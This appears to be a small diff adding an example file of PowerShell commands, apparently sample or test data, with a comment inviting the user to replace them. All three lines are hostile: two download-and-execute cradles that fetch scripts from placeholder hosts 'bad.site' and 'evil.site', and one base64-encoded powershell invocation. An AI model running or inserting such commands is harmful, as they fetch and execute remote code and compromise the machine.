@@ -1,0 +1,5 @@
+command
+# Replace these examples with your own commands
+IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload1.ps1')
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')
+powershell -enc SQBFAFgA
